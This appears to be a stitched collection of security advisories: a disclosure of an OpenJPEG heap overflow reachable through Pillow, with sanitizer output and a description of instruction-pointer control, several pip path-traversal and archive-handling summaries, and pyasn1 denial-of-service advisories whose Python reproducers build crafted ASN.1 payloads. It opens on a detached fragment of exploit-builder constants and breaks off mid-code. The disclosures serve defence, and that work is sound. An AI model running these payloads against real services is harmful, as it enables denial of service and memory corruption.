ImageFile.MAXBLOCK; _save() never makes it bigger here JFIF_HEADER = 20  # SOI + JFIF APP0, written by jpeg_start_compress() ICC_OVERHEAD = 18  # FFE2 <len> "ICC_PROFILE\0" <seq> <count> ICC_PAYLOAD = ENCODER_BUFFER - JFIF_HEADER - ICC_OVERHEAD  # 65498: exact fit COMMENT = b"C" * 65533  # largest legal COM; content and length chosen by the file  # What the victim application does with an uploaded file, run in a child process # so that we can see it die. ### Summary  Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219  Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.  I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.  Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.  ### Details  ## Affected wheels  From `.github/dependencies.json` (`openjpeg`) at each tag:  | Pillow | bundled OpenJPEG | status | |---|---|---| | 10.4.0 | 2.5.2 | safe | | 11.0.0 | 2.5.2 | safe | | **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** | | **12.0.0 … 12.3.0** | **2.5.4** | **affected** |  Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins `2.5.4` as of 2026-10-06.  ## The defect  `src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:  ```c OPJ_UINT32 l_current_tile_part =     l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =     l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2; ```  `tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.  The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.  Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.  ## Patch status  Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).  The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.  ## Suggested remediation  1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file. 2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code. 3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.  ## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply  `Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.  I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.  That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.  ### Proof of concept  ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:  ``` ==766332==ERROR: AddressSanitizer: heap-buffer-overflow WRITE of size 8     #0 opj_j2k_read_sod          j2k.c:5086     #1 opj_j2k_read_tile_header  j2k.c:9912     #2 opj_read_tile_header      openjpeg.c:575     #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793     #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949     #5 _decode                   src/decode.c:132 located 8 bytes to the right of a 24-byte region allocated by     opj_j2k_build_tp_index_from_tlm j2k.c:8939 ```  Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.  I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.  No disclosure deadline from me; I will not publish anything while this is being worked on.  ### Impact  Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.  **Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.  **Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):  ``` rip  0x4000    <- value chosen by the attacker's file layout rsi  0x3ff2    <- m_error_data, written by the same walk ```  Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.  To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a "fixed" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the "vulnerable" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.

When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.

pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing "incorrect" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.

pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.

pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.

This vulnerability requires downloading or installing a package from a malicious package index to succeed, malicious packages alone are not able to exploit this vulnerability. ### Impact The BER/CER/DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs. A small crafted payload (tens of kilobytes) containing an OID with many arcs consumes seconds of CPU per decode() call, allowing denial of service in any application that decodes untrusted ASN.1 data (certificates, LDAP, SNMP, Kerberos, etc.). The corresponding encoders have the same quadratic behavior, reachable when an application re-encodes previously decoded attacker-supplied values.  The arc-size limit introduced for CVE-2026-23490 bounds the byte length of an individual arc but not the number of arcs, so it does not mitigate this issue.  ### Affected components ObjectIdentifierPayloadDecoder and RelativeOIDPayloadDecoder in pyasn1/codec/ber/decoder.py; ObjectIdentifierEncoder and RelativeOIDEncoder in pyasn1/codec/ber/encoder.py. The CER and DER codecs inherit these and are equally affected.  ### Patches Fixed in pyasn1 0.6.4: arc accumulation in both decoders and encoders now runs in linear time.  ### Workarounds Limit the size of untrusted ASN.1 input before decoding.

### Impact The univ.Real type converted its (mantissa, base, exponent) value to a Python float using exact big-integer exponentiation. A BER/CER/DER-encoded REAL value only a few bytes long can carry a very large exponent, causing this computation to attempt to materialize an astronomically large integer.  Any operation that triggers float conversion on such a decoded value — prettyPrint(), str(), comparison, arithmetic, or an explicit float() call — consumes excessive CPU and memory, hanging the process. Applications that decode untrusted ASN.1 data and then print, log, or compare the decoded objects are vulnerable to denial of service. Decoding alone does not trigger the issue.  ### Affected components - pyasn1.type.univ.Real — float conversion (__float__() and everything built on it: prettyPrint(), str(), comparisons, arithmetic, int()) - Reachable through the pyasn1.codec.ber, cer, and der decoders, which produce Real objects from untrusted input; also via directly constructed Real values  The encoders and the native codec are not affected. Applications that never handle ASN.1 REAL values are not affected.  ### Patches Fixed in pyasn1 0.6.4. Binary (base-2) values are now converted with math.ldexp(), and decimal (base-10) values with exponents beyond float range raise OverflowError without constructing huge intermediate integers. Existing behavior is preserved: out-of-range values raise OverflowError and prettyPrint() renders them as <overflow>.  ### Workarounds Avoid converting, printing, or comparing decoded Real objects from untrusted sources; inspect the raw (mantissa, base, exponent) tuple instead.

pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER decoder shared by the CER and DER codecs parses long-form tags by accumulating continuation octets without an upper bound on the tag ID size, allowing a crafted input to force construction of an arbitrarily large integer with CPU cost growing quadratically and to trigger unhandled ValueError exceptions in Python 3.11+ error formatting paths. Any application decoding untrusted BER, CER, or DER input is affected. This issue is fixed in version 0.6.4.

### Impact The BER decoder (shared by the CER and DER codecs) parses long-form tags by accumulating continuation octets in a loop with no upper bound on the size of the tag ID. A crafted input can force the decoder to build an arbitrarily large integer, with CPU cost growing quadratically in input size — a ~1 MB input consumes over a minute of CPU. On Python 3.11+, the oversized tag ID can also trigger an unhandled `ValueError` (integer string conversion limit) while the decoder formats error messages, violating the documented `PyAsn1Error` contract and potentially bypassing caller error handling.  Any application decoding untrusted BER/CER/DER input is affected.  ### Affected components - `pyasn1.codec.ber.decoder` — `decode()` and `StreamingDecoder` - `pyasn1.codec.cer.decoder` and `pyasn1.codec.der.decoder`, which inherit   the same tag parsing - `pyasn1.type.tag` — `Tag`/`TagSet` reprs could raise `ValueError` when   rendering oversized tag IDs (reachable through decoder error paths)  The encoders and the `pyasn1.codec.native` codec are not affected.  ### Patches Fixed in 0.6.4. Long-form tag IDs are now limited to 20 octets (140-bit tag IDs, matching the existing OID arc limit); oversized tags are rejected with `PyAsn1Error`. Tag ID rendering in reprs and error messages was additionally hardened against the interpreter's integer-to-string conversion limit.  ### Workarounds Bound the size of untrusted input passed to `decode()` before calling it.

## Summary  In pyasn1 through 0.6.4, decoding a constructed BIT STRING with many fragments repeatedly shifts and copies the entire value accumulated so far. For fixed-size fragments, CPU time grows quadratically with the encoded input size. An application that passes sufficiently large, attacker-controlled ASN.1 data to an affected decoder can suffer CPU exhaustion during `decode()`; no conversion or formatting of the decoded value is required.  The BER and CER decoders reach this path for constructed BIT STRING values, with or without an `asn1Spec`. The DER decoder rejects constructed BIT STRING in schema-less decoding, but its schema-driven path accepts a **definite-length** constructed BIT STRING when given a matching `asn1Spec` and reaches the same vulnerable code. Constructed BIT STRING is not valid DER; this DER exposure is due to decoder permissiveness. DER rejects the indefinite-length form.  This is a separate decoder path from the OBJECT IDENTIFIER accumulation fixed in [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj).  ## Technical details  In the 0.6.4 [`BitStringPayloadDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L173-L301), both the [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L237-L255) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L275-L301) fragment loops call `BitString.fromOctetString(..., prepend=bitString)` for every fragment. [`fromOctetString`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/type/univ.py#L614-L627) shifts the growing `SizedInteger` left by the fragment's bit length and ORs in the fragment. Shifting an ever-larger Python integer for each fixed-size fragment makes total work O(n²) for n fragments. The fragments are siblings, so the decoder's nesting-depth limit does not constrain their count; its limit on the number of length octets does not prevent the demonstrated inputs.  In 0.6.4, DER's [tag-driven map](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L40) disables constructed BIT STRING, while its schema-driven type map retains the inherited decoder that permits it. This explains why a schema-less DER rejection is not a negative result for all DER decoding.  Under [X.690](https://www.itu.int/rec/T-REC-X.690-202102-I/en), a conforming CER constructed BIT STRING uses an indefinite-length outer encoding and primitive fragments with 1000 contents octets except possibly the last. That form reaches the affected indefinite-length loop. DER requires primitive string encoding, although the schema-driven pyasn1 decoder accepts the definite-length constructed example below.  ## Impact  An application is exposed when untrusted input can reach one of the affected decoder paths and its input limits admit enough fragments. The work occupies the decoding thread or worker and may cause denial of service. Whether the input is network-accessible or unauthenticated depends on the calling application. This advisory makes no claim that every application using pyasn1, or any particular protocol implementation, accepts such input.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER values trigger the issue without special conditions, privileges, or user interaction. Repeated crafted values could occupy a finite decoder-worker pool and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not claim that every application is network-exposed or fully unavailable; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  ## Reproducer  The definite-length example below is valid BER. It is deliberately not a conforming CER or DER encoding. The second constructor uses conforming CER fragment sizing and framing. CPU times are machine-dependent; run the larger cases only in a local test environment.  ```python import time  from pyasn1.codec.ber import decoder as ber_decoder from pyasn1.codec.cer import decoder as cer_decoder from pyasn1.codec.der import decoder as der_decoder from pyasn1.error import PyAsn1Error from pyasn1.type import univ   def encode_length(size):     octets = size.to_bytes((size.bit_length() + 7) // 8, "big")     return bytes((0x80 | len(octets),)) + octets   def definite_fragments(count):     body = b"\x03\x02\x00\xa5" * count  # one data octet per BIT STRING fragment     return b"\x23" + encode_length(len(body)) + body   def cer_fragments(count):     # Each primitive fragment has 1000 contents octets: one unused-bits     # octet (zero) followed by 999 data octets.     fragment = b"\x03" + encode_length(1000) + b"\x00" + b"\xa5" * 999     return b"\x23\x80" + fragment * count + b"\x00\x00"   def measure(label, decode, payload, **options):     start = time.process_time()     value, remainder = decode(payload, **options)     print(label, len(payload), f"{time.process_time() - start:.3f}s CPU")     assert not remainder and len(value) > 0   for count in (50_000, 100_000, 200_000):     measure(f"BER {count} fragments", ber_decoder.decode,             definite_fragments(count))  for count in (1_000, 2_000, 4_000):     measure(f"CER {count} fragments", cer_decoder.decode,             cer_fragments(count))  sample = definite_fragments(1_000) measure("DER with BIT STRING schema", der_decoder.decode, sample,         asn1Spec=univ.BitString()) try:     der_decoder.decode(sample) except PyAsn1Error:     print("DER without schema rejects the constructed value") else:     raise AssertionError("DER unexpectedly accepted schema-less input") ```  ## Verification  Local measurements of the official v0.6.4 tag on CPython 3.14.8 used `time.process_time()`. A local 0.6.5 candidate containing the fix was timed on the same machine. Times are illustrative, not a guaranteed cost on other systems.  | Input | Size | v0.6.4 CPU | 0.6.5 candidate CPU | | --- | ---: | ---: | ---: | | BER definite, 50,000 fragments | 0.20 MB | 0.530 s | 0.084 s | | BER definite, 100,000 fragments | 0.40 MB | 1.915 s | 0.170 s | | BER definite, 200,000 fragments | 0.80 MB | 7.392 s | 0.344 s | | Conforming CER, 1,000 fragments | 1.004 MB | 0.163 s | 0.0035 s | | Conforming CER, 2,000 fragments | 2.008 MB | 0.657 s | 0.0070 s | | Conforming CER, 4,000 fragments | 4.016 MB | 2.582 s | 0.0144 s |  The definite BER input with 100,000 fragments also decoded through DER with `asn1Spec=univ.BitString()` in 1.949 s on v0.6.4, versus 0.172 s with the 0.6.5 candidate. Schema-less DER rejected the same input. Independent reports reproduced the old behavior on v0.6.4: one measured 21.1 s for a 1.28 MB definite-length value; another measured 7.25 s for a 0.8 MB value versus 2.8 ms for a primitive BIT STRING carrying the same data volume. These measurements were taken on different systems and should not be compared as a single benchmark series.  ## Resolution  Upgrade to pyasn1 0.6.5. The decoder assembles fragment bits in a `bytearray`, preserves decoded bit values including intermediate-fragment padding, and converts the complete payload to a BIT STRING once. This removes the repeated shift of the growing integer in both constructed decoding loops.  For applications that cannot upgrade immediately, enforce an application-appropriate limit on untrusted ASN.1 input size **before** passing it to pyasn1. Such a limit bounds exposure but does not change the quadratic behavior of 0.6.4. Where a protocol forbids constructed BIT STRING, rejecting that encoding before decoding also prevents this path.

### Summary  When an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.  ### Details  ConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.  ### Proof of concept  Run this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:  ```python import sys import time  from pyasn1.codec.ber import decoder from pyasn1.type import univ   def enc_tag(tag_id):     groups = [tag_id & 0x7f]     tag_id >>= 7     while tag_id:         groups.append((tag_id & 0x7f) | 0x80)         tag_id >>= 7     return b'\xbf' + bytes(reversed(groups))   def payload(tag_ids):     body = b''.join(enc_tag(tag_id) + b'\x03\x04\x01A'                     for tag_id in tag_ids)     length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')     return b'\x30' + bytes([0x80 | len(length)]) + length + body   for count in (3200, 6400):     cases = (         ("collision", [32 + i * sys.hash_info.modulus                        for i in range(count)]),         ("control", [(1 << 70) + i for i in range(count)]),     )     for name, tag_ids in cases:         wire = payload(tag_ids)         start = time.process_time()         value, remainder = decoder.decode(wire)         cpu_seconds = time.process_time() - start          assert type(value) is univ.Sequence         assert len(value) == count and remainder == b''         for position, tag_id in enumerate(tag_ids):             component = value.getComponentByPosition(position)             assert component.asOctets() == b'A'             assert component.tagSet[-1].tagId == tag_id          print(count, name, len(wire), round(cpu_seconds, 3)) ```  ### Impact  Applications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.

## Summary  In pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.  This is distinct from [CVE-2026-59886](https://github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.  ## Root cause and affected components  For binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:  ```python p = 0 while chunk:     p <<= 8     p |= chunk[0]     chunk = chunk[1:] ```  Each shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa size. The decoder's [eight-octet length-field limit](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.  The vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.  ## Impact  A comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.  ## Reproduction and evidence  The following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der   def real_value(mantissa_octets):     content = b"\x80\x00" + b"\xff" * mantissa_octets     length = len(content).to_bytes(3, "big")     return b"\x09\x83" + length + content   for codec in (ber, cer, der):     for size in (50_000, 100_000, 200_000):         substrate = real_value(size)         started = time.process_time()         value, rest = codec.decode(substrate)         print(codec.__name__, size, time.process_time() - started)         assert not rest         assert tuple(value)[1:] == (2, 0) ```  The original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.  | Mantissa size | Reporter's BER CPU time | | ---: | ---: | | 50,000 octets | 0.328 s | | 100,000 octets | 1.299 s | | 200,000 octets | 6.043 s | | 400,000 octets | 24.095 s |  The same report measured 5.645 s for a 200,000-octet mantissa through DER.  A separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.  ## Fix  pyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), "big")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.  ## Workarounds  Upgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume.

## Summary  In pyasn1 0.6.4 and earlier, decoding a constructed OCTET STRING or character string made of many fragments can spend disproportionate CPU time repeatedly copying the accumulated value. A separate indefinite-length `ANY` path has the same problem while collecting the encoded components. The work grows roughly quadratically with the number of fixed-size fragments, although the input and decoded value grow linearly. An application that lets an attacker supply such ASN.1 input to an affected decoder can suffer CPU exhaustion.  The affected string paths are available in BER and CER. The DER decoder also accepts certain *non-DER* constructed strings: a definite-length constructed OCTET STRING when an `asn1Spec` selects `univ.OctetString`, and constructed character strings such as UTF8String even without a schema. Indefinite-length `ANY` is affected in BER and CER when an `asn1Spec` selects `univ.Any`; DER rejects indefinite lengths.  This is a distinct decoder path from the OBJECT IDENTIFIER/RELATIVE-OID accumulation addressed by [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj). It has the same complexity class, but the OID fix in 0.6.4 did not change these string or `ANY` loops.  ## Technical details  In the [v0.6.4 BER decoder](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py), `OctetStringPayloadDecoder` appends each decoded fragment to a growing `bytes` value with `header += component` in both its [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L338-L351) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L368-L387) constructed forms. [`AnyPayloadDecoder.indefLenValueDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1403-L1430) similarly uses `chunk += component`. In the exercised paths, each concatenation copies an increasingly large prefix. For `N` fixed-size fragments, the total copied data grows with `1 + 2 + ... + N`, or O(N²).  The OCTET STRING decoder is also the base class of the decoders for UTF8String, NumericString, PrintableString, TeletexString, VideotexString, IA5String, GraphicString, VisibleString, GeneralString, UniversalString, BMPString, ObjectDescriptor, GeneralizedTime, and UTCTime. These types inherit the same constructed-string reassembly path.  The [DER decoder's OCTET STRING restriction](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L49) replaces the tag-driven decoder, but its schema-driven `TYPE_MAP` retains the BER-derived decoder. Thus `der.decode(data)` rejects a constructed OCTET STRING, while `der.decode(data, asn1Spec=univ.OctetString())` accepts its definite-length form and reaches the accumulation loop. DER does not replace the inherited character-string decoders, so a constructed UTF8String is also accepted without `asn1Spec`. These inputs violate [X.690's DER string-encoding rule](https://www.itu.int/rec/T-REC-X.690-202102-I/en) and should not be described as valid DER encodings.  The original short-fragment, definite-length OCTET STRING reproducer is valid BER. The CER decoder accepts it, but it is not a conforming CER string encoding: X.690 requires an indefinite-length outer constructed string and 1,000 contents octets per fragment except possibly the last. A conforming CER-shaped constructed OCTET STRING with those fragment sizes also reaches the loop and shows quadratic growth. The indefinite-length `ANY` reproducer below can represent a CER `SEQUENCE OF OCTET STRING` and reaches the separate `ANY` loop when decoded with an `ANY` schema.  The decoder's eight-octet length-field limit and nesting-depth limit do not bound the number of sibling fragments in these examples. The BER reproducer below uses only a three-octet outer length field; all fragments have shallow nesting. There is no per-message fragment-count cap in v0.6.4.  ## Impact  If an application passes attacker-controlled ASN.1 to the affected `decode()` or `StreamingDecoder` path without an adequate input or resource limit, a megabyte-scale value can occupy a decoding worker for seconds. Repeated inputs can exhaust available CPU. Whether this is reachable before authentication, or through a particular protocol, depends on the application; the library finding alone does not establish those conditions. No confidentiality or integrity impact is claimed.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER inputs trigger the string-reassembly issue without special conditions, privileges, or user interaction. Repeated crafted inputs could occupy all available decoder workers and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not assert that every adopter has such an endpoint or loses all service; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  On the official v0.6.4 tag, local CPU-time measurements with CPython 3.14.8 on macOS arm64 gave the following results. Times vary by machine and Python runtime; the input-size scaling is the relevant observation. “Fixed” means the local 0.6.5 decoder fix applied to the same inputs.  | Decoder path and input | Fragments | v0.6.4 CPU | Fixed CPU | | --- | ---: | ---: | ---: | | BER constructed OCTET STRING, 0.40 MB | 100,000 × 2 payload bytes | 0.340 s | 0.160 s | | BER constructed OCTET STRING, 0.80 MB | 200,000 × 2 payload bytes | 0.886 s | 0.312 s | | BER constructed OCTET STRING, 1.60 MB | 400,000 × 2 payload bytes | 2.738 s | 0.623 s | | BER indefinite `ANY`, 0.30 MB | 100,000 × 1 payload byte | 0.459 s | 0.206 s | | BER indefinite `ANY`, 0.60 MB | 200,000 × 1 payload byte | 1.245 s | 0.412 s | | BER indefinite `ANY`, 1.20 MB | 400,000 × 1 payload byte | 3.980 s | 0.826 s | | CER constructed OCTET STRING, 1.00 MB, conforming fragment layout | 1,000 × 1,000 payload bytes | 0.0089 s | 0.0022 s | | CER constructed OCTET STRING, 2.01 MB, conforming fragment layout | 2,000 × 1,000 payload bytes | 0.0311 s | 0.0044 s | | CER constructed OCTET STRING, 4.02 MB, conforming fragment layout | 4,000 × 1,000 payload bytes | 0.1379 s | 0.0090 s |  For the same short-fragment layout, the original report measured up to 16.05 seconds for a 3.2 MB BER constructed OCTET STRING. These are reporter measurements on different systems, not fixed performance guarantees.  ## Reproduction  This example uses public decoder APIs. Run it with pyasn1 0.6.4 and increase `n` to observe the scaling. The final two calls show the DER paths accepted by v0.6.4; their constructed encodings are not valid DER.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der from pyasn1.type import univ   def tlv(identifier, contents):     length = len(contents)     if length < 128:         return bytes((identifier, length)) + contents     encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")     return bytes((identifier, 0x80 | len(encoded))) + encoded + contents   def measure(label, decode, substrate, asn1Spec=None):     start = time.process_time()     _, rest = decode(substrate, asn1Spec=asn1Spec)     assert not rest     print(f"{label}: {len(substrate)} input bytes, "           f"{time.process_time() - start:.3f} CPU seconds")   n = 100_000 octet_fragments = b"\x04\x02AA" * n utf8_fragments = b"\x0c\x02AA" * n  measure("BER constructed OCTET STRING", ber.decode,         tlv(0x24, octet_fragments)) measure("BER indefinite ANY", ber.decode,         b"\x30\x80" + b"\x04\x01A" * n + b"\x00\x00",         univ.Any())  # CER uses indefinite length and 1,000-content-octet primitive fragments. cer_fragment = tlv(0x04, b"A" * 1000) measure("CER constructed OCTET STRING", cer.decode,         b"\x24\x80" + cer_fragment * 1000 + b"\x00\x00")  # These constructed encodings are accepted by pyasn1 but are invalid DER. measure("DER OCTET STRING with schema", 